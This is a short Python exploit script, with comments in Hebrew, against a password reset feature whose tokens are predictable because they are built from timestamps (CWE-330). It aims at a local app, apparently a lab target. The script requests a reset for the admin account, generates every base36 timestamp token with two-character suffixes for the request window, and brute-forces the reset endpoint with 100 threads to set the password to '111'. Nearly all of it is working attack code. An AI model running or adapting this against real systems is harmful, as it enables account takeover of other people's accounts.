## Weak/Predictable Password Reset Token (CWE-330)
import requests
import time
import itertools
from concurrent.futures import ThreadPoolExecutor

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
URL_REQ = "http://localhost:3001/api/auth/reset-request"
PAYLOAD_REQ = {"email": "admin@hemi-emporium.local"}
session = requests.Session()

URL_RESET = "http://localhost:3001/api/auth/reset-password"
def base36encode(number):
    base36 = ''
    while number:
        number, i = divmod(number, 36)
        base36 = alphabet[i] + base36
    return base36 or alphabet[0]

# מדידת זמן התחלה באלפיות שנייה
start_time = int(time.time() * 1000)

# שליחת בקשה אחת כדי לצמצם את חלון הזמן
try:
    response = session.post(URL_REQ, json=PAYLOAD_REQ, timeout=2)
    print(response.json())
except Exception as e:
    print(f"ERROR: {e}")

# מדידת זמן סיום
end_time = int(time.time() * 1000)

window = end_time - start_time

print(f"Start time: {start_time}")
print(f"End time: {end_time}")
print(f"Time window: {window} milliseconds\n")

# מעבר על כל מילי-שנייה בטווח הזמן
all_tokens = []
# הוספה של כל שילוב אפשרי של שתי אותיות בסוף הטוקן
suffixes = [''.join(p) for p in itertools.product(alphabet, repeat=2)]

for ts in range(start_time, end_time + 1):
    base_token = base36encode(ts)
    print(base_token)
    for suffix in suffixes:
        all_tokens.append(base_token + suffix)

def check_token(token):
    try:
        PAYLOAD_RESET = {"token": token, "newPassword": "111"}
        response = session.post(URL_RESET, json=PAYLOAD_RESET, timeout=2)
        if response.json().get("success"):
            print(f"Token: {token} - Worked!")
        # else:
        #     print(f"Token: {token} - Failed.")
    except Exception as e:
        print(f"ERROR: {e}")
        
with ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(check_token, all_tokens)